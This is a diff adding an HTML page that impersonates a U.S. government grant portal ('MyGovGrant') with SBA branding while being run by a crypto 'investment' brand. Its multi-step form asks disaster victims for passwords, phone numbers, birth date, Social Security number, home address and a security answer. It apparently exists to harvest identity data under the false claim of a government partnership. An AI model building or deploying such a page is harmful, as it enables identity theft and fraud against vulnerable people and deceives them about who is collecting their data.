@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Crypto Brand</title>
+    <!-- Include Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+    </style>
+</head>
+<body class="font-sans antialiased">
+
+    <!-- Navbar -->
+    <nav class="bg-white bg-opacity-800 p-4">
+        <div class="container mx-auto flex items-center justify-between">
+            <div class="flex items-center justify-between w-full md:w-auto">
+                <img src="Vision pro base (1).png" alt="Crypto Brand Logo" class="h-12">
+
+                <!-- Mobile Menu Button -->
+                <div class="md:hidden ml-auto">
+                    <button id="mobile-menu-button" class="text-blue-500 focus:outline-none">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Navigation links -->
+            <div class="hidden md:flex space-x-8 ml-auto">
+                <a href="index.html" class="text-blue hover:text-gray-400">Home</a>
+                <a href="grant.html" class="text-blue hover:text-gray-400">Grant.Gov</a>
+                <a href="contact.html" class="text-blue hover:text-gray-400">Contact</a>
+                <a href="sign-in.html" class="text-blue hover:text-gray-400">Dashboard</a>
+            </div>
+
+            <!-- Log In CTA -->
+            <div class="hidden md:flex ml-4">
+                <a href="sign-in.html" class="bg-blue-500 text-white px-6 py-2 rounded-lg hover:bg-gray-600">Log In</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Overlay -->
+    <div id="overlay" class="fixed inset-0 bg-black opacity-50 hidden"></div>
+
+    <!-- Mobile Menu -->
+    <div id="mobile-menu" class="hidden fixed top-0 right-0 w-64 h-full bg-white shadow-lg transition-transform transform translate-x-full md:hidden">
+        <div class="p-4">
+            <!-- Cancel Button -->
+            <button id="close-menu" class="text-blue-500 mb-4">✖ Close</button>
+            <a href="index.html" class="block text-blue hover:text-gray-400">Home</a>
+            <a href="grant.html" class="block text-blue hover:text-gray-400">Grant.Gov</a>
+            <a href="contact.html" class="block text-blue hover:text-gray-400">Contact</a>
+            <a href="sign-in.html" class="block text-blue hover:text-gray-400">Dashboard</a>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            const splashScreen = document.getElementById('splash-screen');
+            setTimeout(() => {
+                splashScreen.style.display = 'none'; // Hide the splash screen
+                document.body.style.overflow = 'auto'; // Restore scroll
+            }, 4000); // Adjust time to match animation duration
+        };
+
+        const menu = document.getElementById('mobile-menu');
+        const mobileMenuButton = document.getElementById('mobile-menu-button');
+        const closeMenuButton = document.getElementById('close-menu');
+
+        // Toggle mobile menu visibility
+        mobileMenuButton.onclick = function() {
+            menu.classList.toggle('hidden');
+            menu.classList.toggle('translate-x-full'); // Slide in/out effect
+        };
+
+        // Close menu when clicking the close button
+        closeMenuButton.onclick = function() {
+            menu.classList.add('hidden');
+            menu.classList.add('translate-x-full'); // Slide out effect
+        };
+
+        // Close menu when clicking outside of it
+        document.addEventListener('click', function(event) {
+            if (!menu.contains(event.target) && !mobileMenuButton.contains(event.target)) {
+                menu.classList.add('hidden');
+                menu.classList.add('translate-x-full'); // Slide out effect
+            }
+        });
+    </script>
+</body>
+
+<!-- Container -->
+<div class="min-h-screen flex items-center justify-center bg-blue-900 py-12 px-4 sm:px-6 lg:px-8">
+    <div class="max-w-3xl w-full space-y-8 bg-white shadow-lg rounded-lg p-8">
+
+        <!-- Header Section -->
+        <div class="text-center">
+            <img src="sba.svg" class="mx-auto h-12" alt="SBA Logo">
+            <h2 class="mt-6 text-3xl font-extrabold text-gray-900 mb-4">
+                MyGovGrant
+            </h2>
+            <p class="text-xl font-semibold text-gray-600 mb-6">
+                One login for multiple Government Grant programs
+            </p>
+
+            <p class="text-sm text-gray-600 mb-8">
+                Vision pro base investment ltb in partnership with the MyGovGrant for disaster individuals is dedicated
+                to protecting your data, the steps required to register and sign in are necessary to ensure your data will
+                stay safe with us  
+            </p>
+        </div>
+
+        <!-- Step Indicator -->
+        <div class="flex justify-center mb-6">
+            <div class="text-center">
+                <div class="flex items-center">
+                    <div id="step-1-indicator" class="rounded-full bg-green-500 h-4 w-4"></div>
+                    <div class="border-t border-gray-300 flex-auto"></div>
+                    <div id="step-2-indicator" class="rounded-full bg-gray-300 h-4 w-4"></div>
+                    <div class="border-t border-gray-300 flex-auto"></div>
+                    <div id="step-3-indicator" class="rounded-full bg-gray-300 h-4 w-4"></div>
+                </div>
+                <div id="step-indicator-text" class="mt-2 text-sm text-gray-500">Step 1: Account Creation</div>
+            </div>
+        </div>
+
+        <!-- Form -->
+        <form id="multiStepForm">
+            <!-- Step 1: Account Creation -->
+            <div id="step-1" class="space-y-4">
+                <div>
+                    <label for="fullName" class="block text-sm font-medium text-gray-700">Full Name</label>
+                    <input id="fullName" name="fullName" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="John Doe">
+                </div>
+                <div>
+                    <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
+                    <input id="email" name="email" type="email" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="johndoe@example.com">
+                </div>
+                <div>
+                    <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
+                    <input id="password" name="password" type="password" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="********">
+                </div>
+                <div>
+                    <label for="confirmPassword" class="block text-sm font-medium text-gray-700">Confirm Password</label>
+                    <input id="confirmPassword" name="confirmPassword" type="password" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="********">
+                </div>
+                <div>
+                    <label for="homePhone" class="block text-sm font-medium text-gray-700">Home Phone Number</label>
+                    <input id="homePhone" name="homePhone" type="tel" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="(555) 123-4567">
+                </div>
+                <div>
+                    <label for="mobilePhone" class="block text-sm font-medium text-gray-700">Mobile Number</label>
+                    <input id="mobilePhone" name="mobilePhone" type="tel" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="(555) 987-6543">
+                </div>
+            </div>
+
+            <!-- Step 2: Personal Details -->
+            <div id="step-2" class="hidden space-y-4">
+                <div>
+                    <label for="dob" class="block text-sm font-medium text-gray-700">Date of Birth</label>
+                    <input id="dob" name="dob" type="date" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                </div>
+                <div>
+                    <label for="ssn" class="block text-sm font-medium text-gray-700">Your Social Security Number</label>
+                    <input id="ssn" name="ssn" type="password" required class="p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                </div>
+                <div>
+                    <label for="confirmSsn" class="block text-sm font-medium text-gray-700">Confirm Social Security Number</label>
+                    <input id="confirmSsn" name="confirmSsn" type="password" required class="p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                </div>
+                <div>
+                    <label for="homeAddress" class="block text-sm font-medium text-gray-700">Home Address</label>
+                    <input id="homeAddress" name="homeAddress" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="123 Main St">
+                </div>
+                <div>
+                    <label for="city" class="block text-sm font-medium text-gray-700">City</label>
+                    <input id="city" name="city" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="City Name">
+                </div>
+                <div>
+                    <label for="state" class="block text-sm font-medium text-gray-700">State</label>
+                    <input id="state" name="state" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="State Name">
+                </div>
+                <div>
+                    <label for="zipCode" class="block text-sm font-medium text-gray-700">Zip Code</label>
+                    <input id="zipCode" name="zipCode" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="12345">
+                </div>
+                <div>
+                    <label for="country" class="block text-sm font-medium text-gray-700">Country</label>
+                    <input id="country" name="country" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="Country Name">
+                </div>
+            </div>
+
+            <!-- Step 3: MyGovGrant Account -->
+            <div id="step-3" class="hidden space-y-4">
+                <h3 class="text-sm font-bold text-gray-700">MyGovGrant Account</h3>
+                <p class="text-xs text-gray-500 mb-4">You can view or manage your MyGovGrant Loan Accounts on your dashboard.</p>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Do you currently have an open MyGovGrant loan?</label>
+                    <div class="mt-1 flex items-center space-x-4">
+                        <label class="inline-flex items-center">
+                            <input type="radio" class="form-radio text-blue-600" name="sbaLoan" value="yes">
+                            <span class="ml-2">Yes</span>
+                        </label>
+                        <label class="inline-flex items-center">
+                            <input type="radio" class="form-radio text-red-600" name="sbaLoan" value="no">
+                            <span class="ml-2">No</span>
+                        </label>
+                    </div>
+                </div>
+                <div>
+                    <label for="securityQuestion" class="block text-sm font-medium text-gray-700">Security Question</label>
+                    <input id="securityQuestion" name="securityQuestion" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="What is your pet's name?">
+                </div>
+            </div>
+
+            <!-- Navigation Buttons -->
+            <div class="flex justify-between mt-6">
+                <button id="prevBtn" type="button" class="bg-gray-300 text-gray-700 px-4 py-2 rounded-md hover:bg-gray-400 hidden" onclick="prevStep()">Previous</button>
+                <button id="nextBtn" type="button" class="bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700" onclick="nextStep()">Next Step</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+
+
+        <!-- Footer Section -->
+        <div class="mt-8 border-t pt-6 text-center text-gray-500 text-xs">
+            <p>U.S. Small Business Administration</p>
+            <p>409 3rd St, SW. Washington DC 20416</p>
+            <p class="mt-2">
+                <a href="mailto:Info@visionprobase.tech" class="text-blue-600 hover:underline">Info@visionprobase.tech</a> | <a href="#" class="text-blue-600 hover:underline">Accessibility</a>
+            </p>
+        </div>
+    </div>
+</div>
+
+
+<script>
+    let currentStep = 1;
+
+    function updateStepIndicator() {
+        document.getElementById('step-indicator-text').textContent = `Step ${currentStep}: ${currentStep === 1 ? 'Account Creation' : currentStep === 2 ? 'Personal Details' : 'SBA Account'}`;
+        document.getElementById('step-1-indicator').classList.toggle('bg-green-500', currentStep === 1);
+        document.getElementById('step-2-indicator').classList.toggle('bg-green-500', currentStep === 2);
+        document.getElementById('step-3-indicator').classList.toggle('bg-green-500', currentStep === 3);
+    }
+
+    function showStep(step) {
+        document.getElementById('step-1').classList.toggle('hidden', step !== 1);
+        document.getElementById('step-2').classList.toggle('hidden', step !== 2);
+        document.getElementById('step-3').classList.toggle('hidden', step !== 3);
+        document.getElementById('prevBtn').classList.toggle('hidden', step === 1);
+        document.getElementById('nextBtn').textContent = step === 3 ? 'Submit' : 'Next Step';
+        updateStepIndicator();
+    }
+
+    function nextStep() {
+        if (currentStep < 3) {
+            currentStep++;
+            showStep(currentStep);
+        } else {
+            document.getElementById('multiStepForm').submit(); // Simulate form submission
+        }
+    }
+
+    function prevStep() {
+        if (currentStep > 1) {
+            currentStep--;
+            showStep(currentStep);
+        }
+    }
+
+    // Initialize form on step 1
+    showStep(1);
+</script>
+
+</body>
+</html>
